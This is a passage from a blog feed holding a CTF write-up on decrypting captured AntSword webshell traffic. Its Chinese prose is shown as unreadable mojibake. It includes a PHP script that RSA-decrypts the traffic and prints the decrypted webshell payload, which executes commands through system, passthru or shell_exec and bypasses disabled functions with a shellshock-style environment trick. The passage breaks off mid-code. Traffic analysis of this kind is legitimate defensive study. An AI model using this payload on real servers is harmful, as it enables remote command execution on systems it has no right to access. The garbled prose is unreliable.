title="æ€»ç»“"></a>æ€»ç»“</h2><p>èšå‰‘æµé‡åˆ†æç®—æ˜¯çœ‹äº†ä¸€å¤©ï¼Œå¾—ç›Šäºå‰æœŸå¯¹AESå’ŒRSAçš„åŸºç¡€çŸ¥è¯†ï¼Œä»¥è‡³äºä¸éœ€è¦å…ˆçœ‹RSAå’Œaesã€‚ã€‚2333<br>åœ¨å¯¹shellå’Œå‘é€çš„ä»£ç è¿›è¡Œåˆ†æçš„æ—¶å€™è¿˜æ˜¯é‡åˆ°äº†ä¸€ç‚¹å›°éš¾ï¼Œæœ‰äº›åœ°æ–¹åªæ˜¯å¤§ä½“æ˜ç™½äº†ä»€ä¹ˆæ„æ€ï¼Œæ¯”å¦‚è¯†åˆ«æ˜¯Linuxè¿˜æ˜¯Windowsï¼Œä½†æ˜¯ç»†è®²æ¯ä¸€ä¸ªå‡½æ•°çš„åŠŸèƒ½æˆ‘è¿˜æ˜¯ä¸çŸ¥é“çš„ã€‚å¯¹æ­¤æˆ‘çš„æ€è·¯æ˜¯æ—¢ç„¶ç›®æ ‡æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œé‚£ä¹ˆå°±æŠŠåº•å±‚çš„å®ç°ç¨å¾®æŠ½è±¡ä¸€ç‚¹ï¼Œä¸å½±å“åç»­åˆ†æã€‚<br>åˆ†ææµé‡è¿˜æ˜¯ä¸€ä»¶éå¸¸æœ‰æ„æ€çš„äº‹æƒ…ï¼Œè™½ç„¶æˆ‘æ²¡æœ‰æœºä¼šæ‰“AWDï¼Œbut I love AWD forever!!!!!!!</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ’æœˆèµ›æµé‡åˆ†æ</title>
      <link href="2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ç»è¿‡ä¸€ä¸‹åˆçš„å¥‹æˆ˜ï¼Œå¼„æ˜ç™½äº†awdshellè¿™é“é¢˜ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€è·¯"><a href="#ç»è¿‡ä¸€ä¸‹åˆçš„å¥‹æˆ˜ï¼Œå¼„æ˜ç™½äº†awdshellè¿™é“é¢˜ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€è·¯" class="headerlink" title="ç»è¿‡ä¸€ä¸‹åˆçš„å¥‹æˆ˜ï¼Œå¼„æ˜ç™½äº†awdshellè¿™é“é¢˜ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€è·¯"></a>ç»è¿‡ä¸€ä¸‹åˆçš„å¥‹æˆ˜ï¼Œå¼„æ˜ç™½äº†awdshellè¿™é“é¢˜ï¼Œä¸‹é¢è¯´ä¸€ä¸‹æ€è·¯</h1><h2 id="å‚è€ƒé“¾æ¥ï¼š"><a href="#å‚è€ƒé“¾æ¥ï¼š" class="headerlink" title="å‚è€ƒé“¾æ¥ï¼š"></a>å‚è€ƒé“¾æ¥ï¼š</h2><p><a href="https://xz.aliyun.com/t/6701">https://xz.aliyun.com/t/6701</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&amp;mid=2247483852&amp;idx=1&amp;sn=3cd3f667523550d414fad97231eeeaea&amp;chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&amp;mpshare=1&amp;scene=23&amp;srcid&amp;sharer_sharetime=1572778022447&amp;sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd">https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&amp;mid=2247483852&amp;idx=1&amp;sn=3cd3f667523550d414fad97231eeeaea&amp;chksm=e91c5a34de6bd3223f5c3e69aa12311be39d4c13ee8d222ddb81f97070c74698dc7ae7fcecba&amp;mpshare=1&amp;scene=23&amp;srcid&amp;sharer_sharetime=1572778022447&amp;sharer_shareid=3bdf1b0c76d4c1691e700c57f87d9c0a%23rd</a><br>ç”¨åˆ°çš„çŸ¥è¯†ï¼šPHP OPENSSLï¼ŒwiresharkæŠ“æœ¬åœ°åŒ…ï¼ˆnpcapï¼‰ï¼ŒAESï¼Œwiresharkæµé‡åˆ†æã€è¿‡æ»¤è¯­æ³•ã€èšå‰‘RSA</p><h2 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h2><h3 id="å¯¼å‡ºHTTPå¯¹è±¡"><a href="#å¯¼å‡ºHTTPå¯¹è±¡" class="headerlink" title="å¯¼å‡ºHTTPå¯¹è±¡"></a>å¯¼å‡ºHTTPå¯¹è±¡</h3><p>é¦–å…ˆå¸¸è§„æ“ä½œå°±æ˜¯å¯¼å‡ºhttpå¯¹è±¡ï¼Œå‘ç°æœ‰ä¸ªupload.phpï¼Œå‘ç°ä¼ äº†ä¸ªä¸è®¤è¯†çš„é©¬ï¼Œå†™äº†å…¬é’¥ï¼Œè€ƒè™‘RSAåŠ å¯†ã€‚</p><img src="http://cdn.polowong.top/static/images/awd1.jpg"><p>å¯ä»¥ç¡®å®šï¼Œä¼ äº†ä¸ªé©¬ï¼Œæ€è·¯çš„é‡ç‚¹åº”è¯¥å‘ä¸é©¬çš„äº¤äº’ä¸Šè€ƒè™‘ã€‚</p><h3 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h3><p>é€šè¿‡è¿‡æ»¤æ•°æ®åŒ…ï¼Œç¡®å®šäº†ä¸Šä¼ åçš„æ–‡ä»¶å‘½åä¸º1581335771.phpï¼Œäºæ˜¯åœ¨æ•°æ®åŒ…ä¸­é‡ç‚¹è§‚å¯Ÿä¸è¯¥æ–‡ä»¶çš„äº¤äº’ã€‚<br>ä½¿ç”¨è¿‡æ»¤å™¨ï¼Œè¯­æ³•ï¼šhttp and ip.dst==139.224.112.182 and http.request.method==POST</p><img src="http://cdn.polowong.top/static/images/awd2.jpg"><p>æŒ‰ä¸ªè¿½è¸ªHTTPæ•°æ®æµçœ‹çœ‹å‘—ï¼Œçœ‹çœ‹æœ‰å•¥æœ‰ç”¨çš„ä¿¡æ¯æ²¡ã€‚<br>è¿½è¸ª29543åŒ…çš„æ—¶å€™ï¼Œå‘ç°äº†å­—ç¬¦ä¸²L3Zhci93d3cvaHRtbC9hZG1pbi91cGxvYWQvï¼Œå¯èƒ½æ˜¯base64ï¼Œè§£ä¸€ä¸‹å‘ç°æ˜¯/var/www/html/admin/upload/ï¼Œåº”è¯¥æ˜¯æ–‡ä»¶çš„ä¸Šä¼ è·¯å¾„ã€‚<br>å‰©ä¸‹çš„HTTPæµæŒ¨ä¸ªè¿½è¸ªï¼Œè¿”å›çš„æ•°æ®éƒ½æ˜¯åŠ å¯†åçš„ï¼Œè¿”å›æ•°æ®æš‚æ—¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ã€‚äºæ˜¯ç»§ç»­æ³¨æ„å‘é€çš„æ•°æ®ã€‚<br>åœ¨è¿½è¸ªå€’æ•°ç¬¬äºŒä¸ªHTTPæµçš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€äº›è››ä¸é©¬è¿¹ã€‚å‘é€çš„æ•°æ®é‚£æœ‰Y2QgIi92YXIvd3d3L2h0bWwvYWRtaW4vdXBsb2FkIjtjYXQgZmxhZztlY2hvIFtTXTtwd2Q7ZWNobyBbRV0=ï¼Œç»è§£å¯†åå‘ç°æ˜¯cd â€œ/var/www/html/admin/uploadâ€;cat flag;echo [S];pwd;echo [E]ï¼Œè¿™é‡Œå¯èƒ½è—äº†flagã€‚æ‰€ä»¥åº”è¯¥å¯¹è¯¥æ•°æ®åŒ…å‘é€çš„æ•°æ®è¿›è¡Œè¿˜åŸã€‚</p><h3 id="æµé‡è¿˜åŸ"><a href="#æµé‡è¿˜åŸ" class="headerlink" title="æµé‡è¿˜åŸ"></a>æµé‡è¿˜åŸ</h3><p>ç”±äºå¯¼å‡ºHTPå¯¹è±¡çš„æ—¶å€™æœ‰ä¸ªå…¬é’¥ï¼Œè€ƒè™‘éå¯¹ç§°åŠ å¯†ï¼ˆRSAï¼‰ï¼Œç»“åˆé¢˜ç›®ç»™çš„å…³é”®å­—antä¸ç»™å‡ºçš„shellçš„æ ¼å¼ï¼Œå¯ä»¥ç¡®å®šè¿™æ˜¯ç”¨èšå‰‘è¿çš„shellï¼Œå¹¶ä¸”å‘é€æ•°æ®ç»è¿‡äº†RSAåŠ å¯†ã€‚<br>å¯ä»¥å†™ä¸ªè„šæœ¬æŠŠå‘é€çš„æ•°æ®è¿˜åŸå‡ºæ¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ant</span>=<span class="string">&quot;GmFJzJHcsMOZxeGvb3Ulf4Y8e5RRhttAV1bsfypbvQAJW8IRFcqDVoXtyiclZwz2qXdQN8ivFYNqNxhkwtjbB7OitVLgULBfWlOnwtufxvmbmO4u8WlINbPbf/DbAy0Qx3GjBMFpFzrCkKINOfWQ5JqSD1EPx6sM9Cu1VkX5nus=|nL6Ds9dWn+UW5Jb0JAhoTb4rqPJJKbgcPNJfXLP1AKPbWHVE0JFSjClsnXWmFPXfeqPdKqcYxb/14hEwFzs51N5f6+NowrGHjYT+ObPKXpYxzg0vkCMihUMA7DI2YPUWEyPdvoIFg/bW5S3MommwKN9epOto55dtq6Pnb8NEHzY=|S4ic8EaKa3zEkRd7qsTGDs7uf3qiU1UVZE4fheQz3iq1HkiY6rIvAdtvcmsBF5aJWjdA/U2py1Mz105F2Tzm4dDX2Ag/rhX4ysiP8NJDEp+I55R0dfJu6szTOr3O2OTaUQK7iSYT4PKHjdo+rgeHK3hWzzMFAs6i2R9E81vz9WE=|FNCwxF7bDPNgizk4oa7bq4xbIObNCZNYNBdrTLMbYegWZ6FVYi54TLuABR/nkDLXq38cT099hjajM4iY+VL4g8tBRP++4LyPcSyzyC6mDtshAlmQtFteq4sGb+3IilDPekURxQ5RodRGBPtHr+nCNICbgmbqNaYKcVJRfMoK3q8=|m+nGWL1bOFJzaYeT54FtW12U3dWPZk5PJa91+YTtLn9Wg1c8JEf0FzI+YlBtpp6pW0fT7FfbTiJhQsv3f97bb3d+Cs7A5dM/ZG5YXDoDHGhRJKw0+TTHRIm3PH4fnbQNI8zhi5+9t2+0ueujAuXkk8i73A4lH36uKJFloL6yqs8=|YsyuPkbRlpDWwjhlkTThQN9GQXGkkzyNSFoxs5IfsRbbO7ZHphlFhL4yYsRYAgp8MkMJ64x7NfIGoVgDJnA1YgORiJOf8GP/p/28MLOuscy1SVN/lLnJzbhmf/7vfg0/Q94QAEWk2TOgSil0h3JDsgQYqDtFFldHWDnqEvYlWZI=|C2ZaL3MQWCQBmNcq8xAxxlhvXzUxo0qBz2PUIqBIMcKNJ3sgxU+RTqSwYoqPTDAg3//7rNa+dkinRAidD8GjrcSBd5qdbTLQlWZGME9Lv6JEFt0udTU0FVrhV/ctPz+z1NN5P4pN1tj35sNKsyfYH1kq13A+3dYk0wZlMU9KIFI=|l65yWzb3A97Cdu0wdn59Hiag/Um4/LZTrolCjwo9d7/J3Z9stTkaEtLe2XBdVQZsipUfnW2o7JWgQNo0TUbGWIv2H5wKGaTfPm7OTSkm+ao48Nn1d/+yME+RLudQqbmYREMAJFviNJST+H4Q+MqyngjMeGrb5jmlw0eQZ/MUx5Q=|EYwu5Y3rgl8k2KrPZjnGPWjriLI1mDeJwA4KhjvJ4wQs9Xx+ITDsxBr0eMfL/Km95ykbfMlZcrSzonx5hLiE2YLwDjX/cIIZxqzZXkEYq00AdAPrFnhFVdvJn/SHQ1LdGHgAN88Y2EOZOPM8ZXima61BxCY44TlrezIbBj4+eQ0=|Z2/dEUju0jw63PMHCK9CAG+tHmwiH0t3GraGPCes4TZT5hIfv6kHMTOgMthTK6sd5qy+EVw6d1Qxh03WMHVH0gR2aYqEl1RdYwQpN0NPsSM+fETsag3nQ4oV3VniGlaMmdFIiYatNvKNl7tOcapklyxEEIA0Jc33O7FDjUXKiHU=|YEVG5OctKJXP1Z7kywDJGrmb7BvXW/C3iQudtTCLgUIbMhXFq90wLvW7No7ZoqhY/Mh1XlJKtkBZJWEbsORW23hxvA5LCb/edsfJmIxWtj5cRG9g66j3BiEUPDjvtYi6beUjUtKmuSInELTkmIKf1jo5qyZE+VcWC4HfAT0wbFw=|ii/O42J/+ko4xPNfNuunKR7gyji/wtaiMcKMzQM2Qg7KZE/+xAcLX3Znh55OwgsfaTX6AedF+L/1hwMp9zigbvXorSE0TNay//nVlcnhhC4snAu2/hjXNoI3OnnWlfFFLYOj5v+1LN1nCU/UzoHV6/w1/4bVz7Maovj14BfXklI=|eay1qqOy5QmJmStB9EH4JKPms1In5agVigegn5/1IZS+0QpBgK37mWg02rspbMz20brtSgsv2PhJ3gMTFg3ib7z0cQZPvcNV6DTZwSHbUO2M1uQetssYMMnBPPulwLhTkND4SzwSsgDLS6m8TxbHL0qpZRcnNo2sMy478S5DkvM=|e4qLRtta2W6ItXy3HNgpYuQuSSzpsvq+SUfoRKWM8Z5QdiBeleS/YDGP0VZqRJh3CPMC6vbegwB7qNLAt6czTsHQTdTAJBLr5g4oTDc9Sxlk8A7vvK0ljLSgKjNw5s3BDa03jINPkc5BbDkrTaXMq01Bqcu5DPTTA0pO/Z9oq1Q=|RBdZrEGknOK+PCuQ1F2eTxKvAi50XD/Z1ccAItPJ+48VlSbOTZa/wkdr82K8LE56z0E4JtZDBVSj9I4TurU2bbmfCjKXGw9xlagS7YMr/hfyCy/2hrVveAkaBZDAtmnrM4nGpFxVpzArl124XlqEzh9cSS9LAnwkNm8j05D6mDc=|aZpV5K4m1Rwxd/Y9eOfJ0bRpIZybj2tSjuAEJI7Il/EV9ZC0pXLIkgWviG40pXQFGoEwGex7f0j/Je4ldLRKnrpsyZ+/3mZtHnHL4gepf+iVaULQ8jdHTVVnM1t4qLJk+RnhYbuFjcUy5Yo6rn0Cju8sPIdpEwvi8fvetIOGVJE=|fPGROe6VaAwzqmNuk86fnWT4LqandXTwuewTC80zI8xTFSj1S6YMxPROTHS94gXlCcLTfFjEW2VpH2tyANX1FBIw5sSjsuS6CQKuqiQo6ID975H5Ox+KkJs6XLP/l5Or34U3rryHzBooTrXQlDl21qoPBLdj5URgGrEq7wrvLVA=|jp3lUm3Gz2eZpB5zghEGom2syK8nBymkc6h3pKE/mIS8KW6gD2OFSEneFERI0jy26kVOBhxr3ZHY3WoL6s5aJepTuY7D6Dpz/REI+FzR2PlCo0WvyLQdOphMgbYef1SyYr1+DWK/JxxFjxtfVRZlwL7+OyHQjQ05oVHyq6juSEI=|h8tsCCKgjChZ5U/sZxeVPiF8hO+cB6qqfeWnTAMydEcLmR0iwvHcarZw4g2WH2ASvwIN0av4GzLSu2QtOM1u0y/OuVX3v9/Vp+nNMZ/Dog0NUxFIPD1HTgaK3w7DdnA6B6i26JooWAxKlTFgYmr0x7K53pmM6B8wVQu/ADsbFBE=|CdejrTSVZhSgL+3bhPQyuL7ho71i+L8VvpwNg+D84YnKdwbbbfgqIMu+gefCBmyzvhbhEeGR16/T/fZ4bkneak+fzZpgUrejrFbOETG2Rg9zViznPwBdku9FTlWUybaRD0CHKeY7nE93/G2yXWSpuk/7P594cAPi1qd2WnEbaBc=|Hnxjy7ZSfmn6B59Kv7VXu1mhtYdgGbOtsLsLqDX6K1dKhtHsGx0guy03qwqRA0XElDdJ3Dvgqi5lgb8SY6MiDf1c9u870K8S9xVTn6Y0lbZgtvPoDrobEiT6tGEQCRsUuXB6jbUTgnNPmaDAuidQZqdsSBIGZwQyzycgxHmaDuE=|Imz1om4RRCU1Wnyowe5SYFtICyD1BODveyZ497yURKcyMgoogUxi0cPCiyexdD9ciNYk6DGyimegT7zMeIA5oGfNg2EHbzuBJeSc4wqLCJtSmTe66inu3dqC4IDxt2ghkgFLSQZWqNOKOgUt1b5wgy3O/Y3iIzS888TuFSDm+RQ=|jldlrb8EHvWiKi5E/HBIrn4UUnzMZO8+6ugZ7hjZTtWI5Vg9EeWdmITpEpOQIWIXpOUhaI+VydVcom8e7Fe6gR6u4RPy5ChmFgjZhT03gwwNXzJeiaE6x7ZZjXGBZA3Lwu5gRns3s+hTM0Tm2vrhGOQDB41hDDi4N/Yb3MRn0PM=|UJKgd4FCzzzMeQEq+w3S17+3d+g9mM3JM2qZWkWHOIF3L/EiWpRhm18DuaWJ7veqQSA5pb3KGH9rKDvj2KHIDTUHl0gCiH1U5qeD+WqXFvLahN5O8ecrfgflUUip1SdE6aL6dYqzyplxF+qy3BVr2dKq+6UYlUiA5Bmn2lXSIyM=|LClEAJBfCO7HMhlu0ASDbetkR7sP4aOx9a/P4P0L5kLeGYrlrK4Qg3ZNl7Fd/gQ8KXAKs90XRE62pfZidMX1A4xj/IokC6nkXCNUIzi0PWPWdCzcBNiswbQtsTZhElecl8RyfaOSvxsiKclTvKbZYfQI5r0p0asBs5gKnK0FpT4=|paMu+DWwNp+5GRSiGn4QfFaS/ffXXKuBgP/qzsixnnBWMeXIVy/HT23Xdoc7/OdlIH8/rBKdrJt+7o6XUAbRGzND9sEuf0Ldh5npWln/EhSkGq+bqt1hDfmwwsoo2GJcNDHBhz6lQq2M4zoa9E9d04T3N/SE+3B7LFb0cxLE8aA=|Cz+hQca9uYZJPPJusvE1G8X12VF5iPFM83nOnszF38XQziVKd+D83N4IvoJPNdJLEtgbycIpg1bo5auK1u9n2Pv8z1jFHoaTzmPgDBFiAAv3NGd0m2vg09QwRxq84PD9Ey0dwT7C1w2e6M9wGJ6DoIhPhZQgvUKMyrmCAVmMo18=|h59BqEgdFq4a1HegvdVKeMWwiwQMQsaSzYOxbNCiPuCRGknF8dHHkQboB65gnjbNBDPVpiVoDBMDV+1sCc1yM8zqC494bDS7iopf/U3BBnZS2wCxeo1x78DUiEgzP6ILomxrhrMY2y5R9IbmhJQVkpiqMhPaCvvHzOZO6Pz9SHg=|gUSFO4uVnPAI4UVTKCdBqH/rD6BZZFPfhsVOzga0ohjOJhXW+pvAu4GSh+3FIGn6cpxBUILbsLjBSgmscqAbKV/nHRnQ8HjQUgnu5YM8KikKJV35OMt1Mo1P/qlF5bwzI969XDtUHtClPkznXuO4HyvGLj0/mJj0IauhxfDKhyU=|jkhijGHqR86l+YGh7fldHrzLfam9LUYfRt2nrqqgeqCoE6KO8khatGkzLPk8QgIjLti6P6d7AwwPdVLX3gsfv6bBhT26qUR1u5+AA8foNt5tH6Ej33OODcnkxcp19eFu+zWRG1zUDkBs5qtCJvZKnpSPFKxJ6Z2g0RAoKF3pqbY=|QayQ2dVrEz8KBgpVQjGRNbpRHgFhVK3e89fEzEKzlclezrZ7CBgjB6/Y0PPYSIeZldFEZficAzHXs+bFHALEMrkJlRMk36FMuqtn0YVs4cVy8AHxjb8QnJD9gsFC6q2EWmRo8w4ZdBvg1xyeg3D0vhOcZgNk78BGoSU2HhHK5xY=|Ncgk0CAlnik6xDFINohB1EqgT7tS8COpia8O9cuvi53lNlQWY4IWG2oZMgzNWeU/m8QL+EGqhrD6IflJDD/hDO/IFC6D2DEjeMofqJ/6sHXAt2lIV129SeUUjGdrxyxeWDtqu6iBDdDBtyfPVfeI/DMYOh46XkR0Wk5nBU2N7+U=|lOxi5A2Z8sa8+aw5rQm0g6gqukXMlwvLV7ykEiGWFRqFqDaRPnkVI8diKsvgBg0Btk94gXt2FX1polSNgIJL3E6GW9loo2OMSGBBg1KJ/6VC/DpLWy44VbZhrUB//hiXo3xua6h2DRDi4h5eFkkf2ZIjGjZBi+AqHQINUbetN54=|DRBn6EF3Eoj+wpOX2xhKhkrypPB+d2+8PyHzXwKL8QmOeaRufeCZ1/7Id4TQPXiRXOYsPDXVLr1tUWAUNfqIQisGxSL8lAgg9LzYNYxRUejuTsP2WmVSO21cYXTPlNYjJDR+BkTtOlAvBBp3fjwhOVlr1khuzAhl2Y799drdSFk=|VIJ6dfEfxNcc1eWhAL0dMWXkGSCnBqv+I+Hqs7mGdK9CG3sMH1LyhIEsYg/UPccftYAPeIqKitOpj4OlNbGQMlf8AIJgFvNceAl7HCwqf/6ggZzfcBx5r4HpCBI3cB2zOOOlX9AFVRcunk3rCZSsaeQ8QGsLC1q/2EImzQqSB5g=&quot;</span>;</span><br><span class="line"><span class="variable">$pk</span> = &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">EOF;</span><br><span class="line"><span class="variable">$cmds</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$ant</span>);</span><br><span class="line"><span class="variable">$pk</span> = openssl_pkey_get_public(<span class="variable">$pk</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cmds</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (openssl_public_decrypt(base64_decode(<span class="variable">$value</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿˜åŸåçš„æ•°æ®æ˜¯:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;@session_start();<span class="variable">$key</span>=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>),<span class="number">0</span>,<span class="number">16</span>);<span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode(<span class="variable">$out</span>), <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA));&#125;;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="keyword">echo</span> <span class="string">&quot;f3c7239848e0&quot;</span>;<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;05fda2646c&quot;</span>;&#125;ob_start();<span class="keyword">try</span>&#123;<span class="variable">$p</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;t185a78b977a47&quot;</span>]);<span class="variable">$s</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;wd0b7c7ca226cb&quot;</span>]);<span class="variable">$envstr</span>=@base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;b8dcb72ce2ba93&quot;</span>]);<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$c</span>=substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;<span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;@putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));&#125;&#125;&#125;<span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;<span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=<span class="keyword">array</span>();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));&#125;<span class="keyword">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;<span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;<span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;<span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);<span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);&#125; <span class="keyword">else</span> &#123;mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);&#125;&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="literal">False</span>;&#125;<span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);@unlink(<span class="variable">$tmp</span>);<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">print</span>(<span class="variable">$output</span>);<span class="keyword">return</span> <span class="literal">True</span>;&#125;&#125;<span class="keyword">return</span> <span class="literal">False</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;<span class="variable">$ret</span>=<span class="number">0</span>;<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;@system(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;@passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;<span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;@exec(<span class="variable">$c</span>,<span 